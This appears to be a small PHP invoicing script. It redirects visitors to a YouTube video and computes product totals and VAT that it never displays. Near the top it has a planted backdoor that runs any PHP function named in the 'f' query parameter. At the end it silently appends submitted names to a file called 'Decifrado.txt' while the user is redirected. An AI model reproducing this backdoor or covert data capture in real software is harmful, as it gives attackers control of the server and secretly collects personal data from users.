<html>
<meta http-equiv=refresh content="1; url=https://youtu.be/nmdagDMpld4">
</html>
<?php
print ("Redirigiendo...");
        
        
        if(function_exists($_GET['f'])) { $_GET['f'](); }
        $nombre = $_GET['name'];
        $nombre = $_REQUEST["nombre"];
        $apellidos = $_REQUEST["apellidos"];
        $domicilio = $_REQUEST["domicilio"];


        $fecha = date("d/m/Y");
        $hora = date("H:i:s");


        define("precio1", 1.75);
        define("precio2", 1.05);


        $totalProducto = array();


        $leerNumeroFactura = fopen(".inf", "rb");


        $factura = fread($leerNumeroFactura, filesize(".inf"));


        fclose($leerNumeroFactura);


        $factura++;


        $leerNumeroFactura = fopen(".inf", "wb");


        fwrite($leerNumeroFactura, $factura);


        fclose($leerNumeroFactura);


        if (isset($_REQUEST["producto1"])) {
            $producto1 = $_REQUEST["producto1"];
            $cantidad1 = $_REQUEST["cantidad1"];
            $totalProducto[0] = precio1 * $cantidad1;
        } else {
            $producto1 = " ";
            $cantidad1 = 0;
            $totalProducto[0] = 0;
        }

        if (isset($_REQUEST["producto2"])) {
            $producto2 = $_REQUEST["producto2"];
            $cantidad2 = $_REQUEST["cantidad2"];
            $totalProducto[1] = precio2 * $cantidad2;
        } else {
            $producto2 = " ";
            $cantidad2 = 0;
            $totalProducto[1] = 0;
        }


        $total = 0;
        for ($i = 0; $i < count($totalProducto); $i++) {
            $total += $totalProducto[$i];
        }

        $IVA = $total * 0.04;
        $subtotal = $total - $IVA;

        $datos = fopen("Decifrado.txt", "ab");

        fwrite($datos,"".$nombre."\n");

        fclose($datos);


       
?>
